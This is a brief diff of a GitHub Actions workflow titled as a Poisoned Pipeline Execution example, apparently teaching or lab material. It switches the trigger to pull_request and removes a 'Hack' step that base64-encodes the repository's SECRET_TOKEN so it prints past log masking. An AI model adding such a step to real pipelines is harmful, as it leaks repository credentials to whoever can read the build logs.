@@ -1,6 +1,6 @@
 name: Poisoned Pipeline Execution pipeline
 
-on: push
+on: pull_request
 
 jobs:
     build:
@@ -12,7 +12,3 @@ jobs:
             - name: Build project
               run: |
                 echo "Building the application..."
-
-            - name: Hack
-              run: |
-                echo ${{secrets.SECRET_TOKEN}} | base64
